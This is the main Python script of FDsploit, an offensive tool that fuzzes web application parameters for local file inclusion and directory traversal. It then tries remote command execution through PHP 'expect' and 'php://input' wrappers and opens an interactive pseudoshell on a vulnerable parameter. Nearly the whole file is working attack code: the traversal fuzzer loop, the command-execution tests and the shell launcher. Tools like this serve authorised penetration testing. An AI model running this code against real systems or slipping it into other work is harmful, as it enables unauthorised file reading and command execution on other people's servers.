#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__      = 'Christophoros Petrou (game0ver)'
__description__ = 'FDsploit.py: File inclusion & directory traversal fuzzer/enumeration & exploitation framework'
__version__     = '1.2'

import sys
reload(sys)
sys.setdefaultencoding("utf-8")
from core.menu import *
from core.utils import *
from core.colors import *
from core.banners import *
from core.lfishells import *
from core.validations import *
warnings.filterwarnings("ignore")

# define some globals
CUSTOM = False
HOST, PORT = None, None
USER_AGENT = 'FDsploit_{}_agent'.format(__version__)


# make it also return a code positive/negative
def test_php_expect(command, verb, url, param, cookie, proxy, parameters=None):
    print '\n{}[*]{} Trying to execute commands with "expect"...'.format(BT, S)
    if verb == "GET":
        ans1 = req(verb, inject(url, param, 'COMMAND'), cookie, proxy)
        ans2 = req(verb, inject(url, param, php_expect(command)), cookie, proxy)
    else: # POST request
        parameters[param] = 'COMMAND'
        ans1 = req(verb, url, cookie, proxy, parameters)
        parameters[param] = php_expect(command)
        ans2 = req(verb, url, cookie, proxy, parameters)
    if hashpage(ans1.text) != hashpage(ans2.text):
        ret(.1)
        print "{0}[+]{1} It's seems possible to be able to execute commands with 'expect'!".format(FG,S)
        return 1
    else:
        ret(.1)
        print "{0}[x]{1} It's seems it's NOT possible to execute commands with 'expect'!".format(FR,S)
        return 0


def test_php_input(command, verb, url, param, cookie, proxy):
    if verb == "GET":
        print '{}[*]{} Trying to execute commands with "php://input"...'.format(BT, S)
        ans1 = req(verb, inject(url, param, 'COMMAND'), cookie, proxy)
        ans2 = req(verb, inject(url, param, 'php://input'), cookie, proxy, raw_data=php_input(command))
        if hashpage(ans1.text) != hashpage(ans2.text):
            ret(.1)
            print "{0}[+]{1} It's seems possible to be able to execute commands with 'php://input'!".format(FG,S)
            return 1
        else:
            ret(.1)
            print "{0}[x]{1} It's seems it's NOT possible to execute commands with 'php://input'!".format(FR,S)
            return 0
    else:
        pass
        return 0


def LFIshell(shell_type, url, verb, cookie, tchar, proxy, b64, uenc, parameters=None):
    """LFI pseudoshell"""
    try:
        param = str(raw_input(">> Vulnerable parameter: ")).strip()
        if param:
            if shell_type == "simple":
                simple_shell(verb, url, param, cookie, proxy, tchar, b64, uenc, parameters)
            if shell_type == "expect":
                expect_shell(verb, url, param, cookie, proxy, parameters)
            if shell_type == "input":
                input_shell(verb, url, param, cookie, proxy)
        else:
            sys.exit(0)
    except KeyboardInterrupt:
        sys.exit(0)


def Fuzzer(url, verb, cookie, depth, payload, tchar, proxy, b64, uenc, keyword, cmd, parameters, custom=False):
    """main fuzzer"""
    try:
        if verb == "GET":
            _url = Url(url)
            print "\n{0}[+]{1} Url: {2}".format(BT, S, url)
            if custom:
                params = _url.wildcardParams()
                print "{0}[+]{1} Wildcard Mode: {2}ON{1}".format(BT,S,FG)
            else:
                params = _url.detect()
                print "{0}[+]{1} Wildcard Mode: {2}OFF{1}".format(BT,S,FR)
        if verb == 'POST':
            if custom:
                params = wildcardPostParams(parameters)
            else:
                params = parameters.keys()
        init_req      = req(verb, url, cookie, proxy, parameters)
        initialLength = getLen(init_req.content)
        initialHash   = hashpage(init_req.content)
        print "{0}[+]{1} Initial content length: {2}".format(BT,S,BT+str(initialLength)+S)
        print "{0}[*]{3} {2}{1}{4}{3}{2} parameters detected:{3}".format(BT,FC,UN,S,len(params))
        if params:
            for p in params: print "• {}".format(p)
            for param in params:
                print "\n{0}[*]{1} {2}Checking {0}{2}{3}{1}{2} parameter{1}".format(FG,S,UN,param)
                counter = 0
                while counter <= depth:
                    query = createQuery(b64, uenc, tchar, counter, payload)
                    if verb == 'POST':
                        parameters[param] = query
                        ans = req(verb, url, cookie, proxy, parameters)
                    else:
                        ans = req(verb, inject(url, param, query), cookie, proxy)
                    if ans.status_code == 200:
                        pagehash = hashpage(ans.text)
                        contentLength = getLen(ans.text)
                        print "{} ❯ Payload: {}".format(FC+str(ans.status_code)+S, FC+query+S)
                        if contentLength != initialLength:
                            print " ╚═[ Content-length ❯ {}".format(FG+str(contentLength)+S)
                            print " ╚═[ Page signature ❯ {}...{}".format(FG+pagehash[:5],FG+pagehash[-5:]+S)
                            if keyword:
                                if keyword in ans.text: print '  ╚═> Found Keyword: "{}{}{}"!'.format(FG, keyword, S)
                        else:
                            print " ╚═[ Content-length ❯ {}".format(FC+str(contentLength)+S)
                            print " ╚═[ Page signature ❯ {}...{}".format(pagehash[:5],pagehash[-5:])
                            # rare but not completely impossible...
                            if keyword:
                                if keyword in ans.text: print '  ╚═> Found Keyword: "{}{}{}"!'.format(FG, keyword, S)
                    else:
                        print "[ {} ❯ Payload: {}".format(FR+str(ans.status_code)+S, query)
                    counter += 1
            if cmd:
                for param in params:
                    print "\n• {1}Trying command execution with '{0}{3}{2}{1}' parameter:{2}".format(BT, UN, S, param)
                    test_php_expect(cmd, verb, url, param, cookie, proxy, parameters)
                    test_php_input(cmd, verb, url, param, cookie, proxy)
        else:
            print "[x] No parameters detected!"
    except KeyboardInterrupt:
        sys.exit(0)


if __name__ == '__main__':
    banner()
    args = console()
    if args.url or args.file:
        if args.payload.startswith('/'): args.payload = args.payload[1:]
        if args.useragent: USER_AGENT = genUA()
        if args.proxy: HOST, PORT = args.proxy.split(':')
    if args.verb == 'POST' and args.params == None:
        print "{}\n[!] POST request requires the parameters to be specified!\n"
        sys.exit(0)
    if args.url:
        if args.lfishell:
            if args.url:
                LFIshell(args.lfishell, args.url, args.verb, args.cookie, args.tchar, args.proxy, args.b64, int(args.urlencode), args.params)
            else:
                print "\n{}[x] A url must be specified!{}".format(BR, S)
                sys.exit(0)
        else:
            # check if a custom parameter is specified --> if YES --> WILDCARD mode ON
            if '*' in args.url: CUSTOM=True
            if args.params:
                if '*' in args.params.values():
                    CUSTOM = True
            Fuzzer(args.url, args.verb, args.cookie, args.depth, args.payload, args.tchar, args.proxy, args.b64, int(args.urlencode), args.keyword, args.cmd, args.params, custom=CUSTOM)
    elif args.file:
        if args.verb == "POST":
            print "{}\n[x]{} Can't use the --file option with POST verb!".format(FR,S)
            sys.exit(0)
        urls = extracturls(args.file)
        if urls:
            for url in urls:
                if '*' in url: CUSTOM=True
                Fuzzer(url, args.verb, args.cookie, args.depth, args.payload, args.tchar, args.proxy, args.b64, int(args.urlencode), args.keyword, args.cmd, args.params, custom=CUSTOM)
    else: 
        print """usage: fdsploit.py [-u  | -f ] [-h] [-p] [-d] [-e {0,1,2}] [-t] [-b] [-x] [-c]
                   [-v] [--params  [...]] [-k] [-a] [--cmd]
                   [--lfishell {None,simple,expect,input}]"""
#_EOF